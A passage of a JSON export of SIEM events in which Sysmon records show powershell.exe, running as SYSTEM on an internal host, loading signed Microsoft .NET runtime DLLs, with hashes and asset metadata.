      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "54df3ebd-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:47:25.7770000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "start",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"7\",\"Version\":\"3\",\"Level\":\"4\",\"Task\":\"7\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:47:25.7849233Z\"},\"EventRecordID\":\"2436638\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"All images\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:47:25.770\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746d-6748-221c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7280\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"ImageLoaded\",\"text\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\clr.dll\"},{\"Name\":\"FileVersion\",\"text\":\"4.8.9290.0 built by: NET481REL1LAST_C\"},{\"Name\":\"Description\",\"text\":\"Microsoft .NET Runtime Common Language Runtime - WorkStation\"},{\"Name\":\"Product\",\"text\":\"Microsoft\u00ae .NET Framework\"},{\"Name\":\"Company\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"OriginalFileName\",\"text\":\"clr.dll\"},{\"Name\":\"Hashes\",\"text\":\"MD5=50A0DE010E52C43234F191D5D35A19F9,SHA256=F6AD611224C0B7FD7BF7B59F5797E377E56E88397CCB67C8BF7EA6ADB48AC121,IMPHASH=01E0958B232430E87E27DC8010111684\"},{\"Name\":\"Signed\",\"text\":\"true\"},{\"Name\":\"Signature\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"SignatureStatus\",\"text\":\"Valid\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "Executable Module",
      "category.high": "Availability Management",
      "category.low": "Control",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.rule": "All images",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_7_Image_loaded",
      "importance": "low",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "7",
      "normalized": true,
      "object": "module",
      "object.process.fullpath": "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\clr.dll",
      "object.process.hash": "IMPHASH:01E0958B232430E87E27DC8010111684 MD5:50A0DE010E52C43234F191D5D35A19F9 SHA256:F6AD611224C0B7FD7BF7B59F5797E377E56E88397CCB67C8BF7EA6ADB48AC121",
      "object.process.hash.imphash": "01E0958B232430E87E27DC8010111684",
      "object.process.hash.md5": "50A0DE010E52C43234F191D5D35A19F9",
      "object.process.hash.sha256": "F6AD611224C0B7FD7BF7B59F5797E377E56E88397CCB67C8BF7EA6ADB48AC121",
      "object.process.meta": "Description:Microsoft .NET Runtime Common Language Runtime - WorkStation | Product:Microsoft\u00ae .NET Framework | Company:Microsoft Corporation",
      "object.process.name": "clr.dll",
      "object.process.original_name": "clr.dll",
      "object.process.path": "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\",
      "object.property": "signature status",
      "object.value": "Valid | Microsoft Corporation",
      "object.version": "4.8.9290.0 built by: NET481REL1LAST_C",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746d-6748-221c-010000003000",
      "subject.process.id": "7280",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:47:25.7840000Z",
      "uuid": "54df3ebe-ad8f-11ef-b052-005056b7517e",
      "text": "The process powershell.exe loaded the module clr.dll on host wperry.dev.it.stf",
      "_checkpoint": 216133856653,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "54df3ebe-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:47:25.7840000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "start",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"7\",\"Version\":\"3\",\"Level\":\"4\",\"Task\":\"7\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:47:25.7859296Z\"},\"EventRecordID\":\"2436639\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"All images\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:47:25.770\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746d-6748-221c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7280\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"ImageLoaded\",\"text\":\"C:\\\\Windows\\\\System32\\\\vcruntime140_clr0400.dll\"},{\"Name\":\"FileVersion\",\"text\":\"14.32.31326.0\"},{\"Name\":\"Description\",\"text\":\"Microsoft\u00ae C Runtime Library\"},{\"Name\":\"Product\",\"text\":\"Microsoft\u00ae Visual Studio\u00ae\"},{\"Name\":\"Company\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"OriginalFileName\",\"text\":\"vcruntime140_clr0400.dll\"},{\"Name\":\"Hashes\",\"text\":\"MD5=006520D546D4E15378B11B1D269559E4,SHA256=7FC846ABD97D7112D6CD1973D5C9F250331A1413A57A1E1456AE55308CA843C0,IMPHASH=86E3224A57B98BECA76A3656422A23F6\"},{\"Name\":\"Signed\",\"text\":\"true\"},{\"Name\":\"Signature\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"SignatureStatus\",\"text\":\"Valid\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "Executable Module",
      "category.high": "Availability Management",
      "category.low": "Control",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.rule": "All images",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_7_Image_loaded",
      "importance": "low",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "7",
      "normalized": true,
      "object": "module",
      "object.process.fullpath": "c:\\windows\\system32\\vcruntime140_clr0400.dll",
      "object.process.hash": "IMPHASH:86E3224A57B98BECA76A3656422A23F6 MD5:006520D546D4E15378B11B1D269559E4 SHA256:7FC846ABD97D7112D6CD1973D5C9F250331A1413A57A1E1456AE55308CA843C0",
      "object.process.hash.imphash": "86E3224A57B98BECA76A3656422A23F6",
      "object.process.hash.md5": "006520D546D4E15378B11B1D269559E4",
      "object.process.hash.sha256": "7FC846ABD97D7112D6CD1973D5C9F250331A1413A57A1E1456AE55308CA843C0",
      "object.process.meta": "Description:Microsoft\u00ae C Runtime Library | Product:Microsoft\u00ae Visual Studio\u00ae | Company:Microsoft Corporation",
      "object.process.name": "vcruntime140_clr0400.dll",
      "object.process.original_name": "vcruntime140_clr0400.dll",
      "object.process.path": "c:\\windows\\system32\\",
      "object.property": "signature status",
      "object.value": "Valid | Microsoft Corporation",
      "object.version": "14.32.31326.0",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746d-6748-221c-010000003000",
      "subject.process.id": "7280",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:47:25.7850000Z",
      "uuid": "54df3ebf-ad8f-11ef-b052-005056b7517e",
      "text": "The process powershell.exe loaded the module vcruntime140_clr0400.dll on host wperry.dev.it.stf",
      "_checkpoint": 216133856654,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "54df3ebf-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:47:25.7850000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "start",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"7\",\"Version\":\"3\",\"Level\":\"4\",\"Task\":\"7\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:47:25.7866478Z\"},\"EventRecordID\":\"2436640\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"All images\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:47:25.770\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746d-6748-221c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7280\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"ImageLoaded\",\"text\":\"C:\\\\Windows\\\\System32\\\\ucrtbase_clr0400.dll\"},{\"Name\":\"FileVersion\",\"text\":\"14.32.31326.0\"},{\"Name\":\"Description\",\"text\":\"Microsoft\u00ae C Runtime Library\"},{\"Name\":\"Product\",\"text\":\"Microsoft\u00ae Visual Studio\u00ae\"},{\"Name\":\"Company\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"OriginalFileName\",\"text\":\"ucrtbase_clr0400.dll\"},{\"Name\":\"Hashes\",\"text\":\"MD5=14BC224C1040570FD58A452973B93591,SHA256=F5189277B5AC83B754462F259188B0E876706CEC5A56BF6F5C35539F1D6510CD,IMPHASH=95C62E6C11D54D65EA2CCAC62EABE0F3\"},{\"Name\":\"Signed\",\"text\":\"true\"},{\"Name\":\"Signature\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"SignatureStatus\",\"text\":\"Valid\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "Executable Module",
      "category.high": "Availability Management",
      "category.low": "Control",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.rule": "All images",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_7_Image_loaded",
      "importance": "low",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "7",
      "normalized": true,
      "object": "module",
      "object.process.fullpath": "c:\\windows\\system32\\ucrtbase_clr0400.dll",
      "object.process.hash": "IMPHASH:95C62E6C11D54D65EA2CCAC62EABE0F3 MD5:14BC224C1040570FD58A452973B93591 SHA256:F5189277B5AC83B754462F259188B0E876706CEC5A56BF6F5C35539F1D6510CD",
      "object.process.hash.imphash": "95C62E6C11D54D65EA2CCAC62EABE0F3",
      "object.process.hash.md5": "14BC224C1040570FD58A452973B93591",
      "object.process.hash.sha256": "F5189277B5AC83B754462F259188B0E876706CEC5A56BF6F5C35539F1D6510CD",
      "object.process.meta": "Description:Microsoft\u00ae C Runtime Library | Product:Microsoft\u00ae Visual Studio\u00ae | Company:Microsoft Corporation",
      "object.process.name": "ucrtbase_clr0400.dll",
      "object.process.original_name": "ucrtbase_clr0400.dll",
      "object.process.path": "c:\\windows\\system32\\",
      "object.property": "signature status",
      "object.value": "Valid | Microsoft Corporation",
      "object.version": "14.32.31326.0",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746d-6748-221c-010000003000",
      "subject.process.id": "7280",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:47:25.7860000Z",
      "uuid": "54df3ec0-ad8f-11ef-b052-005056b7517e",
      "text": "The process powershell.exe loaded the module ucrtbase_clr0400.dll on host wperry.dev.it.stf",
      "_checkpoint": 216133856655,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "54df3ec0-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:47:25.7860000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
